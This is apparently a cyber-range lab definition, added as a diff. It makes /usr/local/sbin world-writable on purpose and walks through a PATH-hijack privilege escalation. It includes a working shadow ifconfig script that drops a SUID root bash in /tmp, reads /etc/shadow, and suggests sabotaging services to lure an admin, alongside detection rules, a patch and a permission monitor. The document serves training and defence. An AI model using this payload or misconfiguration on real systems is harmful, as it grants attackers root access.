@@ -1,0 +1,493 @@
+# Bolt-on: PATH Hijack via World-Writable /usr/local/sbin
+# -------------------------------------------------------
+# Install chmods /usr/local/sbin to 0777 and drops
+# /etc/profile.d/bolton-path.sh that prepends /usr/local/sbin onto PATH
+# for ALL users (including root, since profile.d is sourced for login
+# shells). Any local user can drop a binary in /usr/local/sbin named
+# after a common admin command (e.g. `ifconfig`, `lsof`); when an admin
+# logs in and runs it, the planted binary executes — PATH interception
+# privilege escalation (T1574.007).
+#
+# Patch chmods the dir back to 0755, removes the profile.d script, and
+# installs an /etc/cron.daily/bolton-perm-monitor that compares the
+# permission bits of /usr/local/{bin,sbin,lib} to a baseline and warns
+# on any drift to world-writable.
+#
+# Elastic rule UUID sampled from:
+#   Research/elastic-detection-rules/rules/linux/execution_unusual_path_invocation_from_command_line.toml
+
+id: bolton.privilege-escalation.path-hijack-writable-dir
+slug: path-hijack-writable-dir
+name: "PATH Hijack via World-Writable /usr/local/sbin"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: privilege-escalation
+subcategory: path-interception
+tags:
+  - path-hijacking
+  - profile.d
+  - privilege-escalation
+  - linux
+description: >
+  chmods /usr/local/sbin to 0777 (world-writable) and drops
+  /etc/profile.d/bolton-path.sh that exports
+  `PATH=/usr/local/sbin:$PATH` for every login shell. Any local user
+  can plant a binary in /usr/local/sbin with the same name as a common
+  admin command — the next time root runs that command interactively,
+  the planted binary executes as root (MITRE T1574.007).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1574/007/"
+  - "https://man7.org/linux/man-pages/man8/ld.so.8.html"
+  - "https://owasp.org/www-community/attacks/Path_Traversal"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1574
+    name: "Hijack Execution Flow"
+  subtechnique:
+    id: T1574.007
+    name: "Path Interception by PATH Environment Variable"
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "82f842c2-7c36-438c-b562-5afe54ab11f4"
+      rule_name: "Suspicious Path Invocation from Command Line"
+      rule_filename: "linux/execution_unusual_path_invocation_from_command_line.toml"
+      coverage: partial
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Fires when /usr/local/sbin/<unusual> is invoked from an interactive shell — catches the post-exploit hit."
+  signal_sources:
+    - "Auditd PERM_MOD on /usr/local/sbin (mode mask includes 0002)"
+    - "Auditd FILE_CREATE on /etc/profile.d/*"
+    - "Auditd FILE_CREATE on /usr/local/sbin/* by non-root uid"
+    - "Auditd execve of /usr/local/sbin/<name> with parent=login shell + euid=0"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services: []
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Make /usr/local/sbin world-writable."
+      role_vars:
+        path: "/usr/local/sbin"
+        state: directory
+        mode: "0777"
+    - ansible_role: ansible.builtin.copy
+      description: "Prepend /usr/local/sbin to PATH via /etc/profile.d."
+      role_vars:
+        dest: "/etc/profile.d/bolton-path.sh"
+        content: |
+          # bolton — prepend /usr/local/sbin so planted binaries shadow system ones.
+          export PATH=/usr/local/sbin:$PATH
+        owner: root
+        group: root
+        mode: "0644"
+  verify:
+    probe: |
+      stat -c %a /usr/local/sbin | grep -q 777
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Restore /usr/local/sbin to 0755 and remove the profile.d script."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Restore /usr/local/sbin to 0755."
+      role_vars:
+        path: "/usr/local/sbin"
+        state: directory
+        mode: "0755"
+    - ansible_role: ansible.builtin.file
+      description: "Remove the PATH prepend snippet."
+      role_vars:
+        path: "/etc/profile.d/bolton-path.sh"
+        state: absent
+  verify:
+    probe: |
+      test "$(stat -c %a /usr/local/sbin)" = "755" && test ! -e /etc/profile.d/bolton-path.sh
+    timeout_seconds: 15
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Restore /usr/local/sbin to 0755, remove the profile.d script, and
+    install /etc/cron.daily/bolton-perm-monitor. The monitor seeds a
+    baseline at /var/lib/bolton-perm-baseline on first run (mode bits of
+    /usr/local/bin, /usr/local/sbin, /usr/local/lib) and syslog-warns
+    when subsequent runs see drift toward world-writable (mode & 0002).
+  patch_reference:
+    - "https://attack.mitre.org/mitigations/M1022/"
+    - "https://www.cisecurity.org/benchmark/distribution_independent_linux"
+  complexity: low
+  side_effects:
+    - "Baseline file at /var/lib/bolton-perm-baseline (~tens of bytes)"
+    - "Daily cron job at ~06:25 syslog-warns on world-writable drift"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Restore /usr/local/sbin to 0755."
+      role_vars:
+        path: "/usr/local/sbin"
+        state: directory
+        mode: "0755"
+    - ansible_role: ansible.builtin.file
+      description: "Remove the PATH prepend snippet."
+      role_vars:
+        path: "/etc/profile.d/bolton-path.sh"
+        state: absent
+    - ansible_role: ansible.builtin.copy
+      description: "Install the daily perm monitor."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-perm-monitor"
+        content: |
+          #!/bin/sh
+          # bolton-perm-monitor — warn on world-writable drift in /usr/local/{bin,sbin,lib}
+          base=/var/lib/bolton-perm-baseline
+          tmp=$(mktemp)
+          for d in /usr/local/bin /usr/local/sbin /usr/local/lib; do
+            [ -d "$d" ] || continue
+            mode=$(stat -c "%a %n" "$d")
+            echo "$mode" >> "$tmp"
+          done
+          if [ ! -f "$base" ]; then
+            cp "$tmp" "$base"
+            chmod 0644 "$base"
+          else
+            if ! diff -q "$base" "$tmp" >/dev/null 2>&1; then
+              diff "$base" "$tmp" | while read line; do
+                logger -t bolton-perm-monitor "DRIFT: $line"
+              done
+            fi
+          fi
+          # Always warn on any world-writable bit, baseline or no baseline.
+          while read mode dir; do
+            case "$mode" in
+              ???[2367]|??[2367]?|?[2367]??)
+                logger -t bolton-perm-monitor "WORLD-WRITABLE: $dir mode=$mode"
+                ;;
+            esac
+          done < "$tmp"
+          rm -f "$tmp"
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      test "$(stat -c %a /usr/local/sbin)" = "755" && test ! -e /etc/profile.d/bolton-path.sh && test -x /etc/cron.daily/bolton-perm-monitor
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/path_hijack_check.sh"
+
+patch_revert:
+  description: "Remove the perm monitor and re-chmod /usr/local/sbin to 0777 + re-add profile.d — PATH hijack works again."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove the perm monitor."
+      role_vars:
+        path: "/etc/cron.daily/bolton-perm-monitor"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Remove the baseline file."
+      role_vars:
+        path: "/var/lib/bolton-perm-baseline"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Re-make /usr/local/sbin world-writable."
+      role_vars:
+        path: "/usr/local/sbin"
+        state: directory
+        mode: "0777"
+    - ansible_role: ansible.builtin.copy
+      description: "Re-add the PATH prepend."
+      role_vars:
+        dest: "/etc/profile.d/bolton-path.sh"
+        content: |
+          export PATH=/usr/local/sbin:$PATH
+        owner: root
+        group: root
+        mode: "0644"
+  verify:
+    probe: |
+      stat -c %a /usr/local/sbin | grep -q 777 && test -f /etc/profile.d/bolton-path.sh
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Local user can plant binaries in /usr/local/sbin/<common-admin-cmd> and root will execute them on next interactive invocation."
+
+cost:
+  storage_mb: 1
+  cpu_pct: 0
+  detectability: quiet
+
+curriculum:
+  title: "PATH Hijack via World-Writable /usr/local/sbin"
+  summary: >
+    Walkthrough of T1574.007 — Path Interception by PATH Environment
+    Variable — against tllinux01 (10.99.50.13). You enumerate the
+    writable PATH directory, plant a malicious binary masquerading as a
+    common admin tool, wait for root to execute it interactively, and
+    inspect the auditd evidence. Final step covers permission hardening
+    and the perm-monitor cron baseline.
+  learning_objectives:
+    - "Identify writable directories on PATH using linpeas + ls -ld checks."
+    - "Understand why /etc/profile.d/* prepends apply to every login shell, including root's."
+    - "Plant a shadowing binary that copies bash to a SUID location when invoked."
+    - "Map the technique to Elastic's path-invocation rule and explain why it is a partial signal."
+    - "Restore correct directory mode + deploy a perm-drift monitor."
+  prerequisites:
+    - "SSH access to tllinux01 (10.99.50.13) as appuser via the bastion"
+    - "Patience: requires root to log in and run an admin command after the plant"
+  estimated_total_minutes: 30
+  steps:
+    - id: "01-enumerate-path"
+      title: "Enumerate writable PATH directories"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Map the PATH attack surface
+
+        ```bash
+        # On tllinux01 as appuser
+        echo $PATH
+        # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+        # Which directories on PATH are writable to appuser?
+        for d in ${PATH//:/ }; do
+          [ -w "$d" ] && echo "WRITABLE: $d ($(stat -c %a %U:%G "$d"))"
+        done
+        # WRITABLE: /usr/local/sbin (777 root:root)   ← bolt-on artefact
+        ```
+
+        Confirm with linpeas (it scores writable-PATH-dirs in red):
+
+        ```bash
+        /tmp/linpeas.sh -a 2>/dev/null | grep -A2 "Writable PATH"
+        ```
+
+        Inspect the profile-wide PATH injection:
+
+        ```bash
+        cat /etc/profile.d/bolton-path.sh
+        # export PATH=/usr/local/sbin:$PATH
+        ```
+
+        Because `/etc/profile.d/*.sh` is sourced by every login shell
+        (bash, sh, zsh), this prepend hits root the next time root
+        opens a fresh login shell. Existing shells already running are
+        unaffected — that's why this hijack often pays off after a
+        scheduled job or cron reboot.
+
+        **Detection callout:** auditd PERM_MOD on /usr/local/sbin with
+        mode mask & 0002 (world-writable bit set) — auditd rule
+        `-w /usr/local/sbin -p wa -k path_dir_mod` captures the install.
+    - id: "02-plant-binary"
+      title: "Plant the malicious shadowing binary"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 2 — Drop a binary that root will run
+
+        Choose a target — pick something an admin types interactively.
+        Good candidates: `lsof`, `ifconfig`, `netstat`, `dmesg`. We'll
+        shadow `ifconfig` (still widely used despite ip-route2 superseding it).
+
+        ```bash
+        # On tllinux01 as appuser
+        cat > /usr/local/sbin/ifconfig << 'EOF'
+        #!/bin/bash
+        # PATH hijack payload — copies bash with SUID bit set, then
+        # exec's the real ifconfig so the admin sees nothing unusual.
+        cp /bin/bash /tmp/.bsh 2>/dev/null
+        chmod 4755 /tmp/.bsh 2>/dev/null
+        exec /usr/sbin/ifconfig "$@"
+        EOF
+        chmod +x /usr/local/sbin/ifconfig
+
+        ls -la /usr/local/sbin/ifconfig
+        # -rwxr-xr-x 1 appuser appuser ... /usr/local/sbin/ifconfig
+        ```
+
+        > **Why a SUID-bash drop, not a reverse shell?** A reverse shell
+        > runs once and dies the moment the admin's shell closes. SUID
+        > bash sits dormant — when you later run `/tmp/.bsh -p` you get
+        > a persistent root shell with no further interaction needed.
+
+        Now wait. Optionally, accelerate the timeline by triggering
+        anything that makes the admin investigate (fill a disk, spike
+        CPU, fail a service) so they log in.
+
+        **Detection callout:** auditd FILE_CREATE on
+        `/usr/local/sbin/*` by non-root uid is the highest-fidelity
+        signal at this stage. Configure `-a always,exit -F arch=b64
+        -F dir=/usr/local/sbin -F uid!=0 -k path_plant`.
+    - id: "03-wait-trigger"
+      title: "Trigger / wait for root execution"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 3 — Root runs the planted command
+
+        When root logs into a new shell and runs `ifconfig`:
+
+        ```bash
+        # Root's session — this is what root sees
+        root@tllinux01:~# ifconfig
+        eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+          inet 10.99.50.13 ...
+        ```
+
+        The output looks identical to the real binary (the wrapper
+        exec'd /usr/sbin/ifconfig). Meanwhile, on the appuser side:
+
+        ```bash
+        # Back as appuser
+        ls -la /tmp/.bsh
+        # -rwsr-xr-x 1 root root 1265688 ... /tmp/.bsh   ← SUID root
+
+        /tmp/.bsh -p
+        bash-5.1# id
+        uid=1001(appuser) gid=1001(appuser) euid=0(root) groups=1001(appuser)
+        bash-5.1# cat /etc/shadow
+        root:$6$...
+        ```
+
+        The `-p` flag tells bash NOT to drop privileges even though
+        ruid != euid — that's the bash quirk that makes SUID-bash a
+        viable shell-spawning primitive.
+
+        **Detection callout:** **Suspicious Path Invocation from
+        Command Line** (`82f842c2-7c36-438c-b562-5afe54ab11f4`) fires
+        when `/usr/local/sbin/<unusual>` is invoked from an interactive
+        shell — it's a partial signal because it cannot distinguish a
+        planted shadow from a legitimate locally-installed admin tool.
+      assessment:
+        question: "Why does the planted binary use `exec /usr/sbin/ifconfig $@` at the end?"
+        options:
+          - "To make the script faster"
+          - "So the admin sees the expected output and doesn't notice the hijack"
+          - "exec is required by bash for setuid scripts"
+          - "It marks the script as transient so logs don't capture it"
+        correct_index: 1
+        explanation: >
+          Operational stealth: passing arguments through to the real
+          binary and replacing the script process with the real one
+          (exec) means stdout/stderr look identical to a legitimate
+          run. The admin sees normal `ifconfig` output, the audit trail
+          shows the real binary being invoked second, and there's no
+          delay or error to investigate. Without the passthrough, the
+          admin would see an empty/different output and immediately
+          suspect tampering.
+    - id: "04-detection-mapping"
+      title: "Detection coverage on the blue side"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 4 — What the SOC sees
+
+        The hijack leaves a wide trail if Auditd + Elastic Defend are
+        enrolled:
+
+        | Stage | Signal | Confidence |
+        |---|---|---|
+        | Install (chmod 0777) | PERM_MOD on /usr/local/sbin | High |
+        | Install (profile.d drop) | FILE_CREATE on /etc/profile.d/* | High |
+        | Plant | FILE_CREATE on /usr/local/sbin/* by uid != 0 | High |
+        | Trigger | execve of /usr/local/sbin/<name>, euid=0, ppid=login | Medium |
+        | Post-exploit | FILE_CREATE on /tmp/.bsh with mode 04755 | High |
+
+        The weakest signal is the trigger — Elastic's path-invocation
+        rule has to allowlist common locally-installed admin tools
+        which means a shadowing binary named after one of them
+        (`htop`, `lsof`, `tmux`) sneaks through. Defenders compensate
+        by alerting on the **post-exploit SUID drop in /tmp** which has
+        no benign explanation.
+
+        **Detection callout:** osquery's `suid_bin` table reporting a
+        new row under /tmp closes the loop — pair it with the
+        path-invocation rule for high-confidence correlation.
+    - id: "05-patch-mitigate"
+      title: "Blue-team: harden + monitor"
+      estimated_minutes: 9
+      markdown: |
+        ## Step 5 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. Restores `/usr/local/sbin` to 0755 (root-only writable).
+        2. Removes `/etc/profile.d/bolton-path.sh`.
+        3. Installs `/etc/cron.daily/bolton-perm-monitor` which seeds a
+           baseline of `/usr/local/{bin,sbin,lib}` modes and
+           syslog-warns on world-writable drift.
+
+        Re-test the attack:
+
+        ```bash
+        # On tllinux01 as appuser
+        cat > /usr/local/sbin/ifconfig << 'EOF'
+        ...
+        EOF
+        # cp: cannot create regular file '/usr/local/sbin/ifconfig': Permission denied
+        ```
+
+        Plant blocked. Verify the monitor ran:
+
+        ```bash
+        sudo cat /var/lib/bolton-perm-baseline
+        # 755 /usr/local/bin
+        # 755 /usr/local/sbin
+        # 755 /usr/local/lib
+        ```
+
+        Defence-in-depth recommendations beyond this bolt-on's patch:
+
+        - Set `umask 022` system-wide (`/etc/login.defs UMASK`)
+          so accidentally-created dirs don't end up world-writable.
+        - Enable **AppArmor** profiles that deny write to
+          /usr/local/sbin for non-root processes.
+        - SIEM correlation rule: PERM_MOD on any directory in PATH +
+          subsequent execve from that dir + euid=0 = high-confidence
+          PATH-hijack alert.
+
+        > **Rollback:** `patch_revert` re-arms /usr/local/sbin to 0777
+        > and re-adds the profile.d snippet.
+      assessment:
+        question: "Which is the highest-fidelity signal that a PATH hijack actually fired (vs the install only)?"
+        options:
+          - "PERM_MOD on /usr/local/sbin"
+          - "FILE_CREATE on /etc/profile.d/bolton-path.sh"
+          - "execve of /usr/local/sbin/<name> with euid=0 AND a fresh SUID binary in /tmp"
+          - "An entry in /var/log/auth.log for root logon"
+        correct_index: 2
+        explanation: >
+          The mode change and profile.d drop are *install* signals —
+          they fire whether anyone exploits the hijack or not. The
+          execve of the planted binary by root, *combined* with the
+          post-exploit SUID drop, is the smoking gun. Either alone has
+          benign analogs (admins do edit /usr/local/sbin); the
+          correlation is what makes it actionable.
+
+status: stable
